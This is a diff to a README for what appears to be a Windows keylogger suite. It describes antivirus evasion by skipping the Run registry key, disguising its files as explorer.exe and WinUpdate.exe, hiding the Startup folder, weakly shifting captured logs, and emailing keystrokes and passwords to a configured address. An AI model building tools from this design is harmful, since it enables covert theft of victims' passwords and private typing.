@@ -10,14 +10,16 @@ To bypass AV, Keylogger does not add its entry at HKCU\Run. Control Panel needs 
 ## Keylogger
 - Location `%AppData%\System\explorer.exe`
 - Form window is not hidden, instead small size at corner
-- Keylogs are encrypted with fixed ASCII shift +20
+- Keylogs are encrypted with encCoce=20 only if password is not blank
 - If sendTo = "none" then email is not sent
 
 ## Control Panel
+- Portable : Can be run from anywhere
 - Simplify modifying configuration files
 - Allow setting autorun using preferred method
-- Provides windows titles picker
+- Provides windows titles picker as well as type manually
 - Provided install button, which copies files to `%AppData%\System`
+- Hides Startup folder
 
 ## Send Mail
 - Location `%AppData%\System\WinUpdate.exe`
@@ -36,7 +38,7 @@ Content: t1, t2, t3, t4, t5 (Window titles)
 
 cmsetacl.tmp
 Location:` "%AppData%\System\cmsetacl.tmp"`
-Content: `"Path to store keylogs","Password","Comp Description","SendEmailReportTo","sendFrom","FromPassword","If fails Retry after n minutes"`
+Content: `"Path to store passwords","Password","Comp Description","SendEmailReportTo","sendFrom","FromPassword","If fails Retry after n minutes"`
 
 Keylogfile
 Location: As per cmsetacl.tmp
